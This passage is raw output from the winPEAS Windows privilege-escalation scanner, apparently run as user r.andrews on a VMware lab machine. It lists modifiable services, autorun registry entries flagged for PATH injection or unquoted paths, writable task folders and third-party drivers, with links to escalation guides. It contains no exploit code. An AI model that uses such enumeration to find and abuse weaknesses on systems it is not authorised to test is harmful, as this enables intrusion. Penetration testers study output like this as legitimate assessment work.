    File Path: \Windows\System32\en-US\MsCtfMonitor.dll.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2064(key)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: AllAccess
    Registry: HKLM\software\microsoft\internet explorer\security
   =================================================================================================

    Handle: 2544(key)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================



════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================


╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    wcncsvc: GenericExecute (Start/Stop)
    BcastDVRUserService_29ccec: GenericExecute (Start/Stop)
    ConsentUxUserSvc_29ccec: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_29ccec: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_29ccec: GenericExecute (Start/Stop)
    DevicePickerUserSvc_29ccec: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_29ccec: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_29ccec: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_29ccec: GenericExecute (Start/Stop)
    UdkUserSvc_29ccec: GenericExecute (Start/Stop)
    UnistoreSvc_29ccec: GenericExecute (Start/Stop)
    UserDataSvc_29ccec: GenericExecute (Start/Stop)
    WpnUserService_29ccec: GenericExecute (Start/Stop)

╔══════════╣ Looking if you can modify any service registry
╚ Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

╔══════════╣ Checking write permissions in PATH folders (DLL Hijacking)
╚ Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


════════════════════════════════════╣ Applications Information ╠════════════════════════════════════

╔══════════╣ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ Installed Applications --Via Program Files/Uninstall registry--
╚ Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
    C:\Windows\System32


╔══════════╣ Autorun Applications
╚ Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: r.andrews [Allow: FullControl]
    Key: OneDrive
    Folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: r.andrews [Allow: AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: *kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64base
    Folder: None (PATH Injection)
    File: wow64base.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64con
    Folder: None (PATH Injection)
    File: wow64con.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: xtajit64
    Folder: None (PATH Injection)
    File: xtajit64.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows
    FilePerms: r.andrews [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: r.andrews [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

╔══════════╣ Device Drivers --Non Microsoft--
╚ Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbd0a.sys
    QLogic 10 GigE - 7.13.171.102 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Boot Camp - 6.1.0.0 [Apple Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AppleSSD.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    MEGASAS2i RAID Controller Driver for Windows - 6.714.22.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.717.02.00 [Broadcom Inc]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Broadcom Limited]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mpi3drvi.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.15.0 build-18052479 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsii.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
